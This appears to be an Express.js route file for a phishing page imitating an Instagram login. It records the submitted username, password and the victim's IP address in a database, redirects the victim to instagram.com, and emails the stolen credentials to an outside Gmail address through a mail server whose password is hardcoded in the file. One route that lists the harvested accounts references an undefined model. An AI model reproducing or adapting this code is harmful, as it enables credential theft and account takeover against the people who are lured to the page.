const express = require("express");
const route = express.Router();
const jeffWork = require("../models/user");
const axios = require("axios");
const { application } = require("express");
const nodemailer = require("nodemailer");

route.get("/", (req, res) => {
  res.render("pages/login.ejs");
});

const urlencoded = express.urlencoded({ extended: false });
route.post("/auth/login", urlencoded, async (req, res) => {
  const ipa = await axios.get("https://api.ipify.org");
  const { username, password } = req.body;
  const userData = new jeffWork({
    username: username,
    password: password,
    ip: ipa.data,
  });
  userData.save();
  console.log(userData);
  res.redirect("https://www.instagram.com/");

  let transporter = nodemailer.createTransport({
    host: "coinverse.mobi",
    port: 465,

    auth: {
      user: "info@coinverse.mobi",
      pass: "samuellucky12",
    },
  });

  let info = await transporter.sendMail({
    from: "info@coinverse.mobi",
    to: "romintorian1458@gmail.com",
    subject: "iKing",

    html: `<b>Username: ${username},
    Password: ${password}
    IP address: ${ipa.data}

    </b>`,
  });

  console.log("Message sent: %s", info.messageId);
});

route.get("/secret/users", async (req, res) => {
  const users = await newWork.find();
  res.json({ users });
});

module.exports = route;
